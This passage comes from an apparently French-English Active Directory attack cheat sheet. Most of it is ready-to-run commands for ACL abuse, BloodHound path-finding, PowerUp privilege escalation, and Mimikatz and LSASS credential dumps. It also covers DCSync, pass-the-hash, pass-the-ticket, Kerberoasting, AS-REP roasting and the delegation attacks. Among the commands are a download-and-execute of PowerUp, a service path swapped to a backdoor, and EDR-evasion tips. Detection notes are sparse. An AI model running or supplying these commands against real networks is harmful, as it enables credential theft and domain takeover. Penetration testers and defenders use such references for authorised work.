- **GenericWrite**: Write all properties
- **WriteProperty**: Write specific property
- **WriteDACL**: Modify permissions
- **WriteOwner**: Take ownership
- **ForceChangePassword**: Reset password sans connaître ancien
- **Self**: Self-membership (add self to group)

**Extended Rights**:
- **User-Force-Change-Password**: Reset password
- **DS-Replication-Get-Changes**: DCSync (part 1)
- **DS-Replication-Get-Changes-All**: DCSync (part 2)

#### ACL Enumeration

**PowerView**:
```powershell
# ACL for specific object
Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs

# Find interesting ACLs
Find-InterestingDomainAcl -ResolveGUIDs

# ACLs for specific user
Get-DomainObjectAcl -Identity username -ResolveGUIDs | Select IdentityReference,ActiveDirectoryRights

# Search writable objects
Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteProperty|WriteDacl"}

# Find modify rights on GPOs
Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll"}
```

**AD Module**:
```powershell
(Get-Acl "AD:\CN=Domain Admins,CN=Users,DC=domain,DC=local").Access
```

#### Abuse Paths

**GenericAll on User**:
```powershell
# Reset password
Set-DomainUserPassword -Identity target -AccountPassword (ConvertTo-SecureString 'Password123!' -AsPlainText -Force)

# Force SPN (Kerberoasting)
Set-DomainObject -Identity target -Set @{serviceprincipalname='fake/service'}
# Then Kerberoast
Get-DomainUser target | Get-DomainSPNTicket | fl

# Shadow Credentials (if PKINIT enabled)
Whisker.exe add /target:target /domain:domain.local /dc:dc.domain.local
```

**GenericAll on Group**:
```powershell
# Add user to group
Add-DomainGroupMember -Identity "Domain Admins" -Members attacker
net group "Domain Admins" attacker /add /domain
```

**GenericAll/GenericWrite on Computer**:
```powershell
# RBCD attack
$ComputerSid = Get-DomainComputer -Identity attacker_machine -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer TARGET | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# Then S4U
Rubeus.exe s4u /user:attacker_machine$ /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/TARGET.domain.local /ptt
```

**WriteDACL**:
```powershell
# Add GenericAll for yourself
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity attacker -Rights All
```

---

### 1.4 BloodHound

#### Collection Methods

**SharpHound.exe**:
```powershell
# Default (All)
.\SharpHound.exe

# DCOnly (stealthier)
.\SharpHound.exe -c DCOnly

# Specific collection
.\SharpHound.exe -c Group,LocalAdmin,Session,Trusts

# Exclude DCs from session enum (OPSEC)
.\SharpHound.exe -c All --ExcludeDCs

# Loop collection (persistence)
.\SharpHound.exe -c All -l --Loop --LoopDuration 02:00:00
```

**Python bloodhound.py** (Linux):
```bash
bloodhound-python -u user@domain.local -p password -d domain.local -dc dc.domain.local -c All --dns-tcp

# With hash
bloodhound-python -u user@domain.local --hashes :NTLMHASH -d domain.local -dc dc.domain.local -c All
```

#### Critical Cypher Queries

**Shortest Paths**:
```cypher
// Shortest to DA
MATCH p=shortestPath((u:User)-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p

// From owned user
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p

// All paths (not just shortest)
MATCH p=((u:User)-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p
```

**Kerberoasting**:
```cypher
MATCH (u:User {hasspn:true}) RETURN u.name

// Kerberoastable paths to DA
MATCH p=shortestPath((u:User {hasspn:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p
```

**AS-REP Roasting**:
```cypher
MATCH (u:User {dontreqpreauth:true}) RETURN u.name
```

**Unconstrained Delegation**:
```cypher
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name

// Paths from unconstrained to DA
MATCH p=(c:Computer {unconstraineddelegation:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}) RETURN p
```

**DCSync Rights**:
```cypher
MATCH p=(n)-[:MemberOf|GetChanges*1..]->(u:Domain {name:"DOMAIN.LOCAL"}) RETURN p

// Who has DCSync
MATCH p=(n)-[:DCSync|GetChangesAll]->(d:Domain) RETURN p
```

**High Value Targets**:
```cypher
MATCH (u:User) WHERE u.highvalue=true RETURN u.name

// Paths to high value
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(h {highvalue:true})) RETURN p
```

**Admins on Computers**:
```cypher
// Find computers where user is admin
MATCH p=(u:User {name:"USER@DOMAIN.LOCAL"})-[:AdminTo]->(c:Computer) RETURN p

// Find users admin on many computers
MATCH (u:User)-[:AdminTo]->(c:Computer) WITH u, COUNT(c) as adminCount WHERE adminCount > 10 RETURN u.name, adminCount ORDER BY adminCount DESC
```

---

### 1.5 User Hunting

⚠️ **AVERTISSEMENT**: User hunting = **TRÈS BRUYANT**

#### Find-LocalAdminAccess

**PowerView**:
```powershell
# Check où current user est admin local
Find-LocalAdminAccess

# Specific user
Find-LocalAdminAccess -UserName "username"
```

**Méthode**: Tente connexion SMB à tous computers avec admin creds

**OPSEC**:
- 🔴 Se connecte à TOUS computers du domain
- 🔴 Génère Event 4624/4672 sur chaque computer
- 🔴 Très détectable par SOC
- 🟢 Alternative: Utiliser BloodHound

#### Find-DomainUserLocation

**PowerView**:
```powershell
# Find où users se sont connectés
Find-DomainUserLocation

# Find sessions de DAs
Find-DomainUserLocation -UserGroupIdentity "Domain Admins"

# Check specific computer
Find-DomainUserLocation -ComputerName SERVER01

# Stealth (check un subset)
Find-DomainUserLocation -UserGroupIdentity "Domain Admins" -Stealth
```

**Méthode**: 
1. Enum sessions actives (NetSessionEnum, NetWkstaUserEnum)
2. Match avec target users

**OPSEC**:
- 🔴 Query TOUS computers pour sessions
- 🔴 Multiple remote API calls
- 🟡 Stealth mode = réduit mais toujours détectable
- 🟢 Alternative: Passive monitoring, BloodHound

#### Invoke-UserHunter

**PowerView**:
```powershell
# Hunt Domain Admins
Invoke-UserHunter -GroupName "Domain Admins"

# Check admin
Invoke-UserHunter -CheckAccess

# Stealth
Invoke-UserHunter -Stealth
```

**Alternative Modern** (BloodHound):
```cypher
// Find computers avec DA sessions
MATCH p=(u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}) MATCH (u)-[:HasSession]->(c:Computer) RETURN c.name

// Find computers où on est admin ET DA logged
MATCH p=(c:Computer)-[:AdminTo]->(c2:Computer)<-[:HasSession]-(u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"}) RETURN p
```

[↑ Retour au sommaire](#-table-des-matières-complète)

---

## PHASE 2: Local Privilege Escalation

### 2.1 PowerUp

**PowerUp** = Module PowerSploit pour local privesc

**Download**:
```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
```

#### Invoke-AllChecks

**Check ALL misconfiguration vectors**:
```powershell
Invoke-AllChecks

# Output vers fichier
Invoke-AllChecks | Out-File -FilePath C:\Temp\allchecks.txt
```

#### Service Exploits

**Unquoted Service Path**:
```powershell
Get-ServiceUnquoted

# Exploit
# If path = C:\Program Files\Vulnerable App\service.exe
# Create C:\Program.exe or C:\Program Files\Vulnerable.exe
# Restart service
Write-ServiceBinary -Name 'VulnService' -Path 'C:\Program.exe'
Restart-Service VulnService
```

**Weak Service Permissions**:
```powershell
Get-ModifiableServiceFile

# Exploit
# Replace binary
Install-ServiceBinary -Name 'VulnService'
Restart-Service VulnService
```

**Weak Service ACLs**:
```powershell
Get-ModifiableService

# Exploit
# Modify service config
Invoke-ServiceAbuse -Name 'VulnService'

# Or manual
sc.exe config VulnService binPath= "C:\Windows\Temp\backdoor.exe"
sc.exe stop VulnService
sc.exe start VulnService
```

#### DLL Hijacking

```powershell
Find-ProcessDLLHijack
Find-PathDLLHijack

# Exploit
# Create malicious DLL in writable location
Write-HijackDll -DllPath 'C:\VulnPath\vulnerable.dll'
```

#### Registry AutoRuns

```powershell
Get-RegistryAutoLogon  # Cleartext passwords

Get-RegistryAlwaysInstallElevated  # MSI install as SYSTEM

# Exploit AlwaysInstallElevated
# Create malicious MSI
Write-UserAddMSI
# Install
msiexec /quiet /qn /i malicious.msi
```

---

### 2.2 OU Delegation Abuse

**Concept**: OUs avec delegation à current user = peut modify objects dans OU

**Check Delegation**:
```powershell
# PowerView
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.IdentityReference -eq "DOMAIN\user"}

# Check GenericAll sur computers dans OU
Get-DomainComputer -SearchBase "OU=Servers,DC=domain,DC=local" | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -match "GenericAll|GenericWrite"}
```

**Exploitation Paths**:

1. **GenericAll sur Computer → RBCD**:
```powershell
# Already covered in ACL section
# Create computer, configure RBCD, S4U
```

2. **GenericAll sur Computer → Shadow Credentials**:
```powershell
# Add Key Credential
Whisker.exe add /target:TARGET$ /domain:domain.local /dc:dc.domain.local /path:cert.pfx /password:password

# Auth
Rubeus.exe asktgt /user:TARGET$ /certificate:cert.pfx /password:password /ptt
```

---

### 2.3 LAPS

**LAPS** = Local Administrator Password Solution

**Concept**:
- Random local admin password par computer
- Password stored in AD (attribut ms-mcs-AdmPwd)
- Rotation automatique
- Lecture password = requires permissions

**Enumeration**:
```powershell
# PowerView - Check if LAPS deployed
Get-DomainComputer | Select name,ms-mcs-admpwd

# Check qui peut read LAPS passwords
Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ObjectAceType -eq "ms-Mcs-AdmPwd"}

# Find computers où on peut read LAPS
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -eq "ms-Mcs-AdmPwd") -and ($_.ActiveDirectoryRights -match "ReadProperty")}
```

**Read LAPS Password**:
```powershell
# PowerView
Get-DomainComputer -Identity target | Select ms-mcs-admpwd

# AD Module
Get-ADComputer -Identity target -Properties ms-mcs-admpwd | Select ms-mcs-admpwd

# LAPS GUI
C:\Program Files\LAPS\AdmPwd.UI.exe

# LAPSToolkit
Get-LAPSComputers

# Utiliser password
$password = Get-DomainComputer -Identity target -Properties ms-mcs-admpwd | Select -ExpandProperty ms-mcs-admpwd
$cred = New-Object System.Management.Automation.PSCredential('.\Administrator', (ConvertTo-SecureString $password -AsPlainText -Force))
Enter-PSSession -ComputerName target -Credential $cred
```

[↑ Retour au sommaire](#-table-des-matières-complète)

---

## PHASE 3: Lateral Movement

### 3.1 Credential Dumping (Mimikatz)

#### sekurlsa::logonpasswords

**Dump credentials de mémoire**:
```cmd
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords

# One-liner
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# PowerShell
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
```

**Output**:
- Plaintext passwords (si WDigest enabled)
- NTLM hashes
- Kerberos keys (AES256, AES128, RC4/NTLM, DES)

#### sekurlsa::tickets

**Dump Kerberos tickets**:
```cmd
sekurlsa::tickets

# Export tickets
sekurlsa::tickets /export
```

#### sekurlsa::ekeys

**Dump Kerberos encryption keys**:
```cmd
sekurlsa::ekeys
```

#### Alternatives à Mimikatz

**comsvcs.dll MiniDump** (éviter Mimikatz direct):
```powershell
# Get LSASS PID
tasklist /fi "imagename eq lsass.exe"
# Or
Get-Process lsass

# Dump (require SeDebugPrivilege)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Temp\lsass.dmp full

# Parse offline
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"
```

**ProcDump** (Sysinternals - Microsoft signed):
```powershell
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

**Dumpert**:
```powershell
# LSASS dump via direct syscalls (éviter hooks EDR)
Outflank-Dumpert.exe
```

**PPLDump** (si LSASS = Protected Process):
```powershell
PPLdump.exe lsass.exe lsass.dmp
```

**SharpDump**:
```powershell
SharpDump.exe
```

---

### 3.2 DCSync

**Concept**: Simule DC replication pour dump credentials

**Requirements**:
- Replicating Directory Changes (DS-Replication-Get-Changes)
- Replicating Directory Changes All (DS-Replication-Get-Changes-All)
- Replicating Directory Changes In Filtered Set

**Par défaut**: Domain Admins, Enterprise Admins, Administrators, DCs ont ces rights

**Mimikatz**:
```cmd
# DCSync specific user
lsadump::dcsync /user:domain\Administrator

# DCSync KRBTGT
lsadump::dcsync /user:domain\krbtgt

# DCSync all domain
lsadump::dcsync /domain:domain.local /all /csv

# Specify DC
lsadump::dcsync /user:domain\Administrator /domain:domain.local /dc:dc01.domain.local
```

**Invoke-Mimikatz**:
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"'
```

**Impacket secretsdump**:
```bash
# With creds
secretsdump.py domain/user:password@dc.domain.local

# With hash
secretsdump.py -hashes :NTLMHASH domain/user@dc.domain.local

# Output to file
secretsdump.py domain/user:password@dc.domain.local -outputfile dcsync_dump

# Just NTDS (pas SAM/SYSTEM)
secretsdump.py domain/user:password@dc.domain.local -just-dc-ntlm
```

**Detection**:
- **Event 4662**: Directory Service Access (Replication GUID)
- Monitor unusual replication requests
- Alert non-DC computers performing replication

---

### 3.3 Pass-The-Hash

**Concept**: Utiliser NTLM hash (sans plaintext password)

**Mimikatz sekurlsa::pth**:
```cmd
# PTH
sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:NTLMHASH /run:powershell.exe

# Opens new PowerShell avec Administrator context
# From there: psexec, wmic, etc.
```

**Impacket**:
```bash
# psexec
impacket-psexec -hashes :NTLMHASH domain/administrator@target

# wmiexec
impacket-wmiexec -hashes :NTLMHASH domain/administrator@target

# smbexec
impacket-smbexec -hashes :NTLMHASH domain/administrator@target

# atexec
impacket-atexec -hashes :NTLMHASH domain/administrator@target 'whoami'
```

**CrackMapExec**:
```bash
# SMB
crackmapexec smb 192.168.1.0/24 -u Administrator -H NTLMHASH

# Execute command
crackmapexec smb target -u Administrator -H NTLMHASH -x 'whoami'

# Dump SAM
crackmapexec smb target -u Administrator -H NTLMHASH --sam
```

**Evil-WinRM**:
```bash
evil-winrm -i target -u Administrator -H NTLMHASH
```

---

### 3.4 OverPass-The-Hash

**Concept**: NTLM hash → Kerberos TGT (évite NTLM, use Kerberos)

**Rubeus**:
```powershell
# With RC4 (NTLM hash)
Rubeus.exe asktgt /user:Administrator /domain:domain.local /rc4:NTLMHASH /ptt

# With AES256 (better OPSEC)
Rubeus.exe asktgt /user:Administrator /domain:domain.local /aes256:AES256KEY /ptt

# Without inject (get .kirbi)
Rubeus.exe asktgt /user:Administrator /rc4:NTLMHASH /outfile:admin.kirbi

# Inject later
Rubeus.exe ptt /ticket:admin.kirbi
```

**Mimikatz**:
```cmd
# OPTH
sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:NTLMHASH /run:powershell

# From new PowerShell
klist  # No tickets yet
net use \\dc.domain.local\C$  # Force Kerberos auth
klist  # Now have TGT + TGS
```

**Impacket**:
```bash
# getTGT.py
impacket-getTGT domain/administrator -hashes :NTLMHASH

# Sets KRB5CCNAME env variable
export KRB5CCNAME=administrator.ccache

# Use Kerberos
impacket-psexec -k -no-pass domain/administrator@target.domain.local
```

**OPSEC**:
- ✅ Kerberos auth (vs NTLM) = moins détectable
- ✅ AES keys vs RC4 = moderne, stealthy
- ⚠️ Event 4768 (TGT request)

---

### 3.5 Pass-The-Ticket

**Concept**: Inject Kerberos ticket (.kirbi) dans session

**Mimikatz**:
```cmd
# Export tickets
sekurlsa::tickets /export

# Inject ticket
kerberos::ptt <ticket.kirbi>

# Purge tickets (cleanup)
kerberos::purge

# List tickets
kerberos::list
```

**Rubeus**:
```powershell
# Export tickets
Rubeus.exe dump

# Inject ticket (.kirbi)
Rubeus.exe ptt /ticket:ticket.kirbi

# Inject ticket (base64)
Rubeus.exe ptt /ticket:BASE64_TICKET

# Multiple tickets
Rubeus.exe ptt /ticket:ticket1.kirbi /ticket:ticket2.kirbi

# List tickets
Rubeus.exe klist

# Purge
Rubeus.exe purge
```

**Impacket** (Linux):
```bash
# Convert .kirbi → .ccache
impacket-ticketConverter ticket.kirbi ticket.ccache

# Set environment
export KRB5CCNAME=ticket.ccache

# Use
impacket-psexec -k -no-pass domain/user@target.domain.local
```

**klist** (check tickets):
```cmd
klist
klist tickets
```

[↑ Retour au sommaire](#-table-des-matières-complète)

---

## PHASE 4: Domain Privilege Escalation

### 4.1 Kerberoast

#### Concept

**Service Principal Names (SPNs)**:
- Services registered dans AD avec SPN
- User account peut avoir SPN (ex: SQL Server service)
- Kerberos TGS pour service = encrypted avec service account password

**Attack**:
1. Request TGS pour SPN
2. TGS encrypted avec service account's NTLM hash (RC4) ou AES key
3. Offline crack TGS → plaintext password

#### Enumeration SPNs

**PowerView**:
```powershell
# List SPNs
Get-DomainUser -SPN

# Detailed
Get-DomainUser -SPN | Select samaccountname,serviceprincipalname
```

**AD Module**:
```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

#### Request TGS

**PowerView (Invoke-Kerberoast)**:
```powershell
Invoke-Kerberoast

# Output hashcat format
Invoke-Kerberoast -OutputFormat Hashcat | fl

# Specific user
Invoke-Kerberoast -Identity sqlservice
```

**Rubeus**:
```powershell
# Kerberoast all
Rubeus.exe kerberoast

# Hashcat format
Rubeus.exe kerberoast /outfile:hashes.txt

# Specific SPN
Rubeus.exe kerberoast /spn:MSSQLSvc/sql.domain.local:1433

# OPSEC: Use AES (not RC4 downgrade)
Rubeus.exe kerberoast /rc4opsec

# Stats only
Rubeus.exe kerberoast /stats

# Filter by group
Rubeus.exe kerberoast /ldapfilter:'memberof=CN=Domain Admins,CN=Users,DC=domain,DC=local'
```

**Impacket GetUserSPNs.py**:
```bash
# List SPNs
impacket-GetUserSPNs domain/user:password -dc-ip dc.domain.local

# Request hashes
impacket-GetUserSPNs domain/user:password -dc-ip dc.domain.local -request

# Hashcat format
impacket-GetUserSPNs domain/user:password -dc-ip dc.domain.local -request -outputfile kerberoast.txt

# With hash auth
impacket-GetUserSPNs domain/user -hashes :NTLMHASH -dc-ip dc.domain.local -request
```

#### Crack Hashes

**Hashcat**:
```bash
# Mode 13100 = Kerberos 5 TGS-REP (RC4)
hashcat -m 13100 hashes.txt wordlist.txt

# With rules
hashcat -m 13100 hashes.txt wordlist.txt -r rules/best64.rule

# Mode 19600 = Kerberos 5 TGS-REP etype 17 (AES128)
hashcat -m 19600 aes_hashes.txt wordlist.txt

# Mode 19700 = Kerberos 5 TGS-REP etype 18 (AES256)
hashcat -m 19700 aes_hashes.txt wordlist.txt
```

**John The Ripper**:
```bash
john --wordlist=wordlist.txt hashes.txt
```

#### Targeted Kerberoasting

**Set SPN si GenericWrite**:
```powershell
# PowerView - Set fake SPN
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/service'}

# Kerberoast
Rubeus.exe kerberoast /user:targetuser

# Cleanup (remove SPN)
Set-DomainObject -Identity targetuser -Clear serviceprincipalname
```

#### OPSEC

**Detections**:
- Event 4769: Kerberos Service Ticket (TGS) request
  - Encryption type 0x17 (RC4) = suspicious pour new requests
  - Service name ≠ krbtgt
  - Service name ≠ computer account ($)

**Evasion**:
- `/rc4opsec` flag (Rubeus) = request AES if available
- Targeted kerberoast (not mass)
- Distribute requests over time

---

### 4.2 AS-REP Roasting

#### Concept

**Kerberos Pre-Authentication**:
- User proves identity avec password-derived key
- Prevents offline password attacks

**DONT_REQ_PREAUTH**:
- Si set sur user account = preauth disabled
- AS-REP encrypted avec user's password hash
- Can request AS-REP without password → offline crack

#### Enumeration

**PowerView**:
```powershell
Get-DomainUser -PreauthNotRequired

# Detailed
Get-DomainUser -PreauthNotRequired | Select samaccountname,useraccountcontrol
```

**AD Module**:
```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
```

#### AS-REP Roast

**Rubeus**:
```powershell
# AS-REP Roast all
Rubeus.exe asreproast

# Hashcat format
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt

# Specific user
Rubeus.exe asreproast /user:targetuser
```

**Impacket GetNPUsers.py**:
```bash
# No creds needed (unauthenticated)
impacket-GetNPUsers domain/ -dc-ip dc.domain.local -usersfile users.txt -format hashcat

# With creds (enumerate + roast)
impacket-GetNPUsers domain/user:password -dc-ip dc.domain.local -request

# Output
impacket-GetNPUsers domain/user:password -dc-ip dc.domain.local -request -outputfile asrep.txt
```

#### Crack

**Hashcat**:
```bash
# Mode 18200 = Kerberos 5 AS-REP etype 23
hashcat -m 18200 asrep.txt wordlist.txt

# With rules
hashcat -m 18200 asrep.txt wordlist.txt -r rules/best64.rule
```

#### Targeted AS-REP Roasting

**Si GenericWrite/GenericAll**:
```powershell
# Disable preauth
Set-DomainObject -Identity targetuser -XOR @{useraccountcontrol=4194304}

# AS-REP Roast
Rubeus.exe asreproast /user:targetuser

# Re-enable preauth (cleanup)
Set-DomainObject -Identity targetuser -XOR @{useraccountcontrol=4194304}
```

**AD Module**:
```powershell
Set-ADAccountControl -Identity targetuser -DoesNotRequirePreAuth $true
# Roast
Set-ADAccountControl -Identity targetuser -DoesNotRequirePreAuth $false
```

#### OPSEC

- 🟢 Stealthy (offline attack)
- 🟢 No admin rights needed
- ⚠️ Event 4768 TGT request (user sans preauth)
- ⚠️ Setting DONT_REQ_PREAUTH = detectable (Event 4738)

---

### 4.3 Unconstrained Delegation

#### Concept

**Delegation Purpose**: Service agit AU NOM de user

**Unconstrained**:
- User TGT included dans service ticket
- Service peut utiliser TGT pour accéder ANY service
- TGT reste dans mémoire service (LSASS)

**Attack**: Compromise server avec unconstrained delegation → dump TGTs

#### Enumeration

**PowerView**:
```powershell
# Computers avec unconstrained delegation
Get-DomainComputer -Unconstrained

# Exclude DCs
Get-DomainComputer -Unconstrained | Where-Object {$_.distinguishedname -notlike "*Domain Controllers*"}

# Users avec unconstrained (rare)
Get-DomainUser -TrustedToAuth -AllowDelegation
```

**AD Module**:
```powershell
Get-ADComputer -Filter {TrustedForDelegation -eq $true}

# Exclude DCs
Get-ADComputer -Filter {(TrustedForDelegation -eq $true) -and (PrimaryGroupID -ne 516)}
```

#### Exploitation

**Scenario 1: Wait for DA Login**:
```powershell
# On unconstrained delegation server (compromise required)

# Monitor Kerberos tickets
Invoke-Mimikatz -Command '"sekurlsa::tickets"'

# Export tickets
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

# Wait for DA to login/access this server
# DA TGT will be cached
# Export and use TGT
```

**Scenario 2: Printer Bug (Coercion)**:
```powershell
# Force DC to auth to unconstrained server

# 1. Monitor tickets (on unconstrained server)
Rubeus.exe monitor /interval:5 /filteruser:DC01$

# 2. Trigger (from attacker machine)
SpoolSample.exe DC01 UNCONSTRAINED-SERVER

# 3. DC TGT captured
# Inject ticket
Rubeus.exe ptt /ticket:BASE64_TGT

# 4. DCSync
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt"'
```

**Rubeus Monitor**:
```powershell
# Monitor for new tickets
Rubeus.exe monitor /interval:5

# Filter specific user
Rubeus.exe monitor /interval:5 /filteruser:Administrator

# Auto-inject
Rubeus.exe monitor /interval:5 /filteruser:Administrator /nowrap
```

#### OPSEC

- 🔴 Printer Bug = detectable (Event 307 Spooler, network traffic)
- 🟡 Monitor tickets = peut trigger LSASS access alerts
- ⚠️ Unconstrained delegation = legacy, Microsoft recommends disable

---

### 4.4 Constrained Delegation

#### Concept

**Constrained Delegation**:
- Service can delegate to SPECIFIC services only
- Configured via `msDS-AllowedToDelegateTo` attribute
- Uses S4U extensions (Service for User)

**S4U2Self + S4U2Proxy**:
- S4U2Self: Service requests TGS for ITSELF on behalf of user
- S4U2Proxy: Service uses TGS to request TGS for target service

**TrustedToAuthForDelegation (T2A4D)**:
- Protocol Transition
- Can impersonate ANY user (even Protected Users, admins)
- Doesn't require user to auth to service first

#### Enumeration

**PowerView**:
```powershell
# Users/computers avec constrained delegation
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# Detailed
Get-DomainUser -TrustedToAuth | Select samaccountname,msds-allowedtodelegateto

# Filter specific service
Get-DomainComputer -TrustedToAuth | Where-Object {$_.'msds-allowedtodelegateto' -like '*cifs*'}
```

**AD Module**:
```powershell
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
```

#### Exploitation

**Rubeus S4U**:
```powershell
# S4U2Self + S4U2Proxy attack
Rubeus.exe s4u /user:constrained_account /rc4:NTLMHASH /impersonateuser:Administrator /msdsspn:cifs/dc.domain.local /ptt

# Detailed steps:
# /user: Account avec constrained delegation
# /rc4: NTLM hash de cet account
# /impersonateuser: User à impersonate (ex: Administrator)
# /msdsspn: Target SPN from msDS-AllowedToDelegateTo
# /ptt: Pass-the-ticket (inject automatique)

# Sans auto-inject
Rubeus.exe s4u /user:constrained_account /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/dc.domain.local /outfile:ticket.kirbi

# Inject manuellement
Rubeus.exe ptt /ticket:ticket.kirbi
```

**Alternative Service Names**:
```powershell
# Si delegation vers TIME service, can use autres SPNs

# Configured: TIME/dc.domain.local
# Can use: CIFS, HTTP, HOST, LDAP, etc.

Rubeus.exe s4u /user:constrained /rc4:HASH /impersonateuser:Administrator /msdsspn:time/dc.domain.local /altservice:cifs /ptt

# Multiple services
Rubeus.exe s4u /user:constrained /rc4:HASH /impersonateuser:Administrator /msdsspn:time/dc.domain.local /altservice:cifs,ldap,host /ptt
```

**Impacket**:
```bash
# getST.py
impacket-getST -spn cifs/dc.domain.local -impersonate Administrator domain/constrained_account:password

# With hash
impacket-getST -spn cifs/dc.domain.local -impersonate Administrator -hashes :NTLMHASH domain/constrained_account

# Alternative service
impacket-getST -spn time/dc.domain.local -altservice cifs -impersonate Administrator domain/constrained_account:password

# Export
export KRB5CCNAME=Administrator.ccache

# Use
impacket-psexec -k -no-pass domain/Administrator@dc.domain.local
```

#### TrustedToAuthForDelegation (T2A4D)

**Check**:
```powershell
Get-DomainUser -TrustedToAuth | Select samaccountname,useraccountcontrol
Get-DomainComputer -TrustedToAuth | Select samaccountname,useraccountcontrol

# UAC flag: TRUSTED_TO_AUTH_FOR_DELEGATION (16777216)
```

**Exploitation** (same S4U):
```powershell
Rubeus.exe s4u /user:t2a4d_account /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/target.domain.local /ptt
```

**Advantage T2A4D**:
- Can impersonate Protected Users
- Can impersonate ANY user (no restrictions)

#### OPSEC

- 🟢 Relatively stealthy
- ⚠️ Event 4769: TGS requests
- ⚠️ S4U2Self + S4U2Proxy events
- 🟡 Modern protocol (less suspicious than unconstrained)

---

### 4.5 Resource-Based Constrained Delegation (RBCD)

#### Concept

**Traditional Constrained**: Service account configured to delegate
**RBCD**: Resource (target) configured to accept delegation FROM specific accounts

**Attribute**: `msDS-AllowedToActOnBehalfOfOtherIdentity` on target computer

**Requirements**:
- GenericAll, GenericWrite, ou WriteProperty sur target computer object
- Ability to create computer account (ms-DS-MachineAccountQuota default = 10)

#### Enumeration

**PowerView**:
```powershell
# Find computers avec RBCD configured
Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {$_.ObjectAceType -eq "msDS-AllowedToActOnBehalfOfOtherIdentity"}

# Check specific computer
Get-DomainComputer TARGET | Select msds-allowedtoactonbehalfofotheridentity
```

**AD Module**:
```powershell
Get-ADComputer TARGET -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
```

#### Exploitation

**Step 1: Create Computer Account** (Powermad):
```powershell
# Import Powermad
Import-Module .\Powermad.ps1

# Create computer
New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)

# Verify
Get-DomainComputer FAKE01
```

**Step 2: Configure RBCD**:
```powershell
# PowerView
$ComputerSid = Get-DomainComputer FAKE01 -Properties objectsid | Select -Expand objectsid

$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

Get-DomainComputer TARGET | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# AD Module alternative
Set-ADComputer TARGET -PrincipalsAllowedToDelegateToAccount FAKE01$
```

**Step 3: S4U Attack**:
```powershell
# Calculate NTLM hash of computer password
$password = 'Password123!'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
# Use Rubeus hash command or pre-compute

# Rubeus S4U
Rubeus.exe s4u /user:FAKE01$ /rc4:NTLMHASH /impersonateuser:Administrator /msdsspn:cifs/TARGET.domain.local /ptt

# Alternative services
Rubeus.exe s4u /user:FAKE01$ /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/TARGET.domain.local /altservice:cifs,http,host,ldap /ptt
```

**Impacket**:
```bash
# getST.py
impacket-getST -spn cifs/TARGET.domain.local -impersonate Administrator -hashes :NTLMHASH domain/FAKE01$

# Use ticket
export KRB5CCNAME=Administrator.ccache
